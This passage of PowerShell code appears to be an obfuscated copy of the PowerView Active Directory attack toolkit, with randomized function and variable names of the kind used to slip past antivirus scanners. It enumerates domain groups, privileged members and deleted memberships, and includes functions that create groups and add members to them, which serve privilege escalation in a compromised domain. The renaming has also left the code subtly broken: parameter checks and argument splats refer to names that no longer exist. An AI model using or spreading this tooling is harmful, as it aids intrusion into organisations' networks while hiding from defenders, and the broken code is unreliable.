                            $MVJzoRlG99 = $MAfzZiLi99.SubString(0, $MAfzZiLi99.IndexOf('/'))
                            $nrOpsRrf99 = $nwpngcEV99.Split('\')[1]
                            $gkqsWVjp99 += "(samAccountName=$nrOpsRrf99)"
                            $cODXoeui99['Domain'] = $MVJzoRlG99
                            Write-Verbose "[ledger] Extracted domain '$MVJzoRlG99' from '$nwpngcEV99'"
                            $JXkxADvG99 = Zimbabweans @SearcherArguments
                        }
                    }
                    else {
                        $gkqsWVjp99 += "(|(samAccountName=$nwpngcEV99)(name=$nwpngcEV99))"
                    }
                }
                if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                    $ypcTqVPU99 += "(|$gkqsWVjp99)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[ledger] Searching for adminCount=1'
                    $ypcTqVPU99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $tgbsdlQM99 = $PSBoundParameters['GroupScope']
                    $ypcTqVPU99 = Switch ($tgbsdlQM99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[ledger] Searching for group scope '$tgbsdlQM99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $oQdfkzpk99 = $PSBoundParameters['GroupProperty']
                    $ypcTqVPU99 = Switch ($oQdfkzpk99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[ledger] Searching for group property '$oQdfkzpk99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[ledger] Using additional LDAP filter: $YcLdsqIq99"
                    $ypcTqVPU99 += "$YcLdsqIq99"
                }
                $JXkxADvG99.filter = "(&(objectCategory=group)$ypcTqVPU99)"
                Write-Verbose "[ledger] filter string: $($JXkxADvG99.filter)"
                if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $JXkxADvG99.FindOne() }
                else { $oboKDFwv99 = $JXkxADvG99.FindAll() }
                $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = proletarian -pwEfoKvn99 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($oboKDFwv99) {
                    try { $oboKDFwv99.dispose() }
                    catch {
                        Write-Verbose "[ledger] Error disposing of the Results object"
                    }
                }
                $JXkxADvG99.dispose()
            }
        }
    }
}
function unctuously {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $kQCfdznv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $RjiorarN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SPrwZXab99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    $DryfxeRC99 = @{
        'Identity' = $kQCfdznv99
    }
    if ($PSBoundParameters['Domain']) { $DryfxeRC99['Domain'] = $StsWGohF99 }
    if ($PSBoundParameters['Credential']) { $DryfxeRC99['Credential'] = $DegNROrc99 }
    $zclAxVXh99 = orthodoxy @ContextArguments
    if ($zclAxVXh99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($zclAxVXh99.Context)
        $Group.SamAccountName = $zclAxVXh99.Identity
        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $zclAxVXh99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $RjiorarN99
        }
        else {
            $Group.DisplayName = $zclAxVXh99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $Group.Description = $SPrwZXab99
        }
        Write-Verbose "[unctuously] Attempting to create group '$kQCfdznv99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[unctuously] Group '$kQCfdznv99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[unctuously] Error creating group '$kQCfdznv99' : $_"
        }
    }
}
function emblazoning {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $cODXoeui99['Domain'] = $StsWGohF99
            $hfELBeHx99 = $StsWGohF99
        }
        else {
            $hfELBeHx99 = $Env:USERDNSDOMAIN
        }
        ledger @SearcherArguments | ForEach-Object {
            $cODXoeui99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $cODXoeui99['Identity'] = $_.managedBy
            $Null = $cODXoeui99.Remove('LDAPFilter')
            $KvcEczcl99 = structuring @SearcherArguments
            $jCTaekUH99 = New-Object PSObject
            $jCTaekUH99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $jCTaekUH99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $jCTaekUH99 | Add-Member Noteproperty 'ManagerName' $KvcEczcl99.samaccountname
            $jCTaekUH99 | Add-Member Noteproperty 'ManagerDistinguishedName' $KvcEczcl99.distinguishedName
            if ($KvcEczcl99.samaccounttype -eq 0x10000000) {
                $jCTaekUH99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($KvcEczcl99.samaccounttype -eq 0x30000000) {
                $jCTaekUH99 | Add-Member Noteproperty 'ManagerType' 'User'
            }
            $sMXTopro99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $sMXTopro99['Server'] = $sWbqYnBA99 }
            if ($PSBoundParameters['SearchScope']) { $sMXTopro99['SearchScope'] = $hZznjEbB99 }
            if ($PSBoundParameters['ResultPageSize']) { $sMXTopro99['ResultPageSize'] = $jrZpVEwq99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $sMXTopro99['ServerTimeLimit'] = $kkbrymyp99 }
            if ($PSBoundParameters['Tombstone']) { $sMXTopro99['Tombstone'] = $YXMSPUCr99 }
            if ($PSBoundParameters['Credential']) { $sMXTopro99['Credential'] = $DegNROrc99 }
            $jCTaekUH99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
            $jCTaekUH99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $jCTaekUH99
        }
    }
}
function Zaporozhye {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $maUntuIA99,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $ATqvnnHL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $GBBmxRSu99 = @{}
        if ($PSBoundParameters['Domain']) { $GBBmxRSu99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $GBBmxRSu99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Credential']) { $GBBmxRSu99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        $JXkxADvG99 = Zimbabweans @SearcherArguments
        if ($JXkxADvG99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $cODXoeui99['Identity'] = $FMEdvzGY99
                $cODXoeui99['Raw'] = $True
                $Group = ledger @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[Zaporozhye] Error searching for group with identity: $FMEdvzGY99"
                }
                else {
                    $LOFDWsEc99 = $Group.properties.item('samaccountname')[0]
                    $NPwmLdoO99 = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $gytlSTjn99 = $StsWGohF99
                    }
                    else {
                        if ($NPwmLdoO99) {
                            $gytlSTjn99 = $NPwmLdoO99.SubString($NPwmLdoO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Zaporozhye] Using LDAP matching rule to recurse on '$NPwmLdoO99', only user accounts will be returned."
                    $JXkxADvG99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$NPwmLdoO99))"
                    $JXkxADvG99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $BznuurjO99 = $JXkxADvG99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $cODXoeui99.Remove('Raw')
            }
            else {
                $gkqsWVjp99 = ''
                $ypcTqVPU99 = ''
                $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                    $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($nwpngcEV99 -match '^S-1-') {
                        $gkqsWVjp99 += "(objectsid=$nwpngcEV99)"
                    }
                    elseif ($nwpngcEV99 -match '^CN=') {
                        $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Zaporozhye] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                            $cODXoeui99['Domain'] = $WbECQjVp99
                            $JXkxADvG99 = Zimbabweans @SearcherArguments
                            if (-not $JXkxADvG99) {
                                Write-Warning "[Zaporozhye] Unable to retrieve domain searcher for '$WbECQjVp99'"
                            }
                        }
                    }
                    elseif ($nwpngcEV99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $wqHaFAge99 = (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                    }
                    elseif ($nwpngcEV99.Contains('\')) {
                        $MAfzZiLi99 = $nwpngcEV99.Replace('\28', '(').Replace('\29', ')') | loomed -ffAeRAxr99 Canonical
                        if ($MAfzZiLi99) {
                            $MVJzoRlG99 = $MAfzZiLi99.SubString(0, $MAfzZiLi99.IndexOf('/'))
                            $nrOpsRrf99 = $nwpngcEV99.Split('\')[1]
                            $gkqsWVjp99 += "(samAccountName=$nrOpsRrf99)"
                            $cODXoeui99['Domain'] = $MVJzoRlG99
                            Write-Verbose "[Zaporozhye] Extracted domain '$MVJzoRlG99' from '$nwpngcEV99'"
                            $JXkxADvG99 = Zimbabweans @SearcherArguments
                        }
                    }
                    else {
                        $gkqsWVjp99 += "(samAccountName=$nwpngcEV99)"
                    }
                }
                if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                    $ypcTqVPU99 += "(|$gkqsWVjp99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Zaporozhye] Using additional LDAP filter: $YcLdsqIq99"
                    $ypcTqVPU99 += "$YcLdsqIq99"
                }
                $JXkxADvG99.filter = "(&(objectCategory=group)$ypcTqVPU99)"
                Write-Verbose "[Zaporozhye] Zaporozhye filter string: $($JXkxADvG99.filter)"
                try {
                    $rKtGlbHQ99 = $JXkxADvG99.FindOne()
                }
                catch {
                    Write-Warning "[Zaporozhye] Error searching for group with identity '$FMEdvzGY99': $_"
                    $BznuurjO99 = @()
                }
                $LOFDWsEc99 = ''
                $NPwmLdoO99 = ''
                if ($rKtGlbHQ99) {
                    $BznuurjO99 = $rKtGlbHQ99.properties.item('member')
                    if ($BznuurjO99.count -eq 0) {
                        $JNYrAQfd99 = $False
                        $yxgSqPwz99 = 0
                        $Top = 0
                        while (-not $JNYrAQfd99) {
                            $Top = $yxgSqPwz99 + 1499
                            $cJNIpgzI99="member;range=$yxgSqPwz99-$Top"
                            $yxgSqPwz99 += 1500
                            $Null = $JXkxADvG99.PropertiesToLoad.Clear()
                            $Null = $JXkxADvG99.PropertiesToLoad.Add("$cJNIpgzI99")
                            $Null = $JXkxADvG99.PropertiesToLoad.Add('samaccountname')
                            $Null = $JXkxADvG99.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $rKtGlbHQ99 = $JXkxADvG99.FindOne()
                                $JrIEXpCs99 = $rKtGlbHQ99.Properties.PropertyNames -like "member;range=*"
                                $BznuurjO99 += $rKtGlbHQ99.Properties.item($JrIEXpCs99)
                                $LOFDWsEc99 = $rKtGlbHQ99.properties.item('samaccountname')[0]
                                $NPwmLdoO99 = $rKtGlbHQ99.properties.item('distinguishedname')[0]
                                if ($BznuurjO99.count -eq 0) {
                                    $JNYrAQfd99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $JNYrAQfd99 = $True
                            }
                        }
                    }
                    else {
                        $LOFDWsEc99 = $rKtGlbHQ99.properties.item('samaccountname')[0]
                        $NPwmLdoO99 = $rKtGlbHQ99.properties.item('distinguishedname')[0]
                        $BznuurjO99 += $rKtGlbHQ99.Properties.item($JrIEXpCs99)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $gytlSTjn99 = $StsWGohF99
                    }
                    else {
                        if ($NPwmLdoO99) {
                            $gytlSTjn99 = $NPwmLdoO99.SubString($NPwmLdoO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($RLVMFVRY99 in $BznuurjO99) {
                if ($maUntuIA99 -and $nhWdcuff99) {
                    $pwEfoKvn99 = $_.Properties
                }
                else {
                    $tKLRdsBe99 = $cODXoeui99.Clone()
                    $tKLRdsBe99['Identity'] = $RLVMFVRY99
                    $tKLRdsBe99['Raw'] = $True
                    $tKLRdsBe99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = structuring @ObjectSearcherArguments
                    $pwEfoKvn99 = $Object.Properties
                }
                if ($pwEfoKvn99) {
                    $WvNbZmsA99 = New-Object PSObject
                    $WvNbZmsA99 | Add-Member Noteproperty 'GroupDomain' $gytlSTjn99
                    $WvNbZmsA99 | Add-Member Noteproperty 'GroupName' $LOFDWsEc99
                    $WvNbZmsA99 | Add-Member Noteproperty 'GroupDistinguishedName' $NPwmLdoO99
                    if ($pwEfoKvn99.objectsid) {
                        $lQuocZUB99 = ((New-Object System.Security.Principal.SecurityIdentifier $pwEfoKvn99.objectsid[0], 0).Value)
                    }
                    else {
                        $lQuocZUB99 = $Null
                    }
                    try {
                        $CkSdVrKZ99 = $pwEfoKvn99.distinguishedname[0]
                        if ($CkSdVrKZ99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $lQuocZUB99) {
                                    $lQuocZUB99 = $pwEfoKvn99.cn[0]
                                }
                                $RnfAHbjX99 = loomed -FMEdvzGY99 $lQuocZUB99 -ffAeRAxr99 'DomainSimple' @ADNameArguments
                                if ($RnfAHbjX99) {
                                    $KeJeUFmP99 = $RnfAHbjX99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Zaporozhye] Error converting $CkSdVrKZ99"
                                    $KeJeUFmP99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Zaporozhye] Error converting $CkSdVrKZ99"
                                $KeJeUFmP99 = $Null
                            }
                        }
                        else {
                            $KeJeUFmP99 = $CkSdVrKZ99.SubString($CkSdVrKZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $CkSdVrKZ99 = $Null
                        $KeJeUFmP99 = $Null
                    }
                    if ($pwEfoKvn99.samaccountname) {
                        $vedlGvLL99 = $pwEfoKvn99.samaccountname[0]
                    }
                    else {
                        try {
                            $vedlGvLL99 = chews -ObjectSID $pwEfoKvn99.cn[0] @ADNameArguments
                        }
                        catch {
                            $vedlGvLL99 = $pwEfoKvn99.cn[0]
                        }
                    }
                    if ($pwEfoKvn99.objectclass -match 'computer') {
                        $zOmHxVqv99 = 'computer'
                    }
                    elseif ($pwEfoKvn99.objectclass -match 'group') {
                        $zOmHxVqv99 = 'group'
                    }
                    elseif ($pwEfoKvn99.objectclass -match 'user') {
                        $zOmHxVqv99 = 'user'
                    }
                    else {
                        $zOmHxVqv99 = $Null
                    }
                    $WvNbZmsA99 | Add-Member Noteproperty 'MemberDomain' $KeJeUFmP99
                    $WvNbZmsA99 | Add-Member Noteproperty 'MemberName' $vedlGvLL99
                    $WvNbZmsA99 | Add-Member Noteproperty 'MemberDistinguishedName' $CkSdVrKZ99
                    $WvNbZmsA99 | Add-Member Noteproperty 'MemberObjectClass' $zOmHxVqv99
                    $WvNbZmsA99 | Add-Member Noteproperty 'MemberSID' $lQuocZUB99
                    $WvNbZmsA99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $WvNbZmsA99
                    if ($PSBoundParameters['Recurse'] -and $CkSdVrKZ99 -and ($zOmHxVqv99 -match 'group')) {
                        Write-Verbose "[Zaporozhye] Manually recursing on group: $CkSdVrKZ99"
                        $cODXoeui99['Identity'] = $CkSdVrKZ99
                        $Null = $cODXoeui99.Remove('Properties')
                        Zaporozhye @SearcherArguments
                    }
                }
            }
            $JXkxADvG99.dispose()
        }
    }
}
function dialectal {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $cODXoeui99['Identity'] = $FMEdvzGY99 }
        structuring @SearcherArguments | ForEach-Object {
            $MSCuKRTY99 = $_.Properties['distinguishedname'][0]
            ForEach($RRMCAMVJ99 in $_.Properties['msds-replvaluemetadata']) {
                $HqKntbfR99 = [xml]$RRMCAMVJ99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($HqKntbfR99) {
                    if (($HqKntbfR99.pszAttributeName -Match 'member') -and (($HqKntbfR99.dwVersion % 2) -eq 0 )) {
                        $MhFNKxWo99 = New-Object PSObject
                        $MhFNKxWo99 | Add-Member NoteProperty 'GroupDN' $MSCuKRTY99
                        $MhFNKxWo99 | Add-Member NoteProperty 'MemberDN' $HqKntbfR99.pszObjectDn
                        $MhFNKxWo99 | Add-Member NoteProperty 'TimeFirstAdded' $HqKntbfR99.ftimeCreated
                        $MhFNKxWo99 | Add-Member NoteProperty 'TimeDeleted' $HqKntbfR99.ftimeDeleted
                        $MhFNKxWo99 | Add-Member NoteProperty 'LastOriginatingChange' $HqKntbfR99.ftimeLastOriginatingChange
                        $MhFNKxWo99 | Add-Member NoteProperty 'TimesAdded' ($HqKntbfR99.dwVersion / 2)
                        $MhFNKxWo99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $HqKntbfR99.pszLastOriginatingDsaDN
                        $MhFNKxWo99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $MhFNKxWo99
                    }
                }
                else {
                    Write-Verbose "[dialectal] Error retrieving 'msds-replvaluemetadata' for '$MSCuKRTY99'"
                }
            }
        }
    }
}
function swagger {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $FMEdvzGY99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $BznuurjO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $DryfxeRC99 = @{
            'Identity' = $FMEdvzGY99
        }
        if ($PSBoundParameters['Domain']) { $DryfxeRC99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Credential']) { $DryfxeRC99['Credential'] = $DegNROrc99 }
        $GCVdxnVh99 = orthodoxy @ContextArguments
        if ($GCVdxnVh99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GCVdxnVh99.Context, $GCVdxnVh99.Identity)
            }
            catch {
                Write-Warning "[swagger] Error finding the group identity '$FMEdvzGY99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($RLVMFVRY99 in $BznuurjO99) {
                if ($RLVMFVRY99 -match '.+\\.+') {
                    $DryfxeRC99['Identity'] = $RLVMFVRY99
                    $IRuFkyVH99 = orthodoxy @ContextArguments
                    if ($IRuFkyVH99) {
                        $TYwqHZTv99 = $IRuFkyVH99.Identity
                    }
                }
                else {
                    $IRuFkyVH99 = $GCVdxnVh99
                    $TYwqHZTv99 = $RLVMFVRY99
                }
                Write-Verbose "[swagger] Adding member '$RLVMFVRY99' to group '$FMEdvzGY99'"
                $RLVMFVRY99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($IRuFkyVH99.Context, $TYwqHZTv99)
                $Group.Members.Add($RLVMFVRY99)
                $Group.Save()
            }
        }
    }
}
function rescued {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $FMEdvzGY99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $BznuurjO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $DryfxeRC99 = @{
            'Identity' = $FMEdvzGY99
        }
        if ($PSBoundParameters['Domain']) { $DryfxeRC99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Credential']) { $DryfxeRC99['Credential'] = $DegNROrc99 }
        $GCVdxnVh99 = orthodoxy @ContextArguments
        if ($GCVdxnVh99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GCVdxnVh99.Context, $GCVdxnVh99.Identity)
            }
            catch {
                Write-Warning "[rescued] Error finding the group identity '$FMEdvzGY99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($RLVMFVRY99 in $BznuurjO99) {
                if ($RLVMFVRY99 -match '.+\\.+') {
                    $DryfxeRC99['Identity'] = $RLVMFVRY99
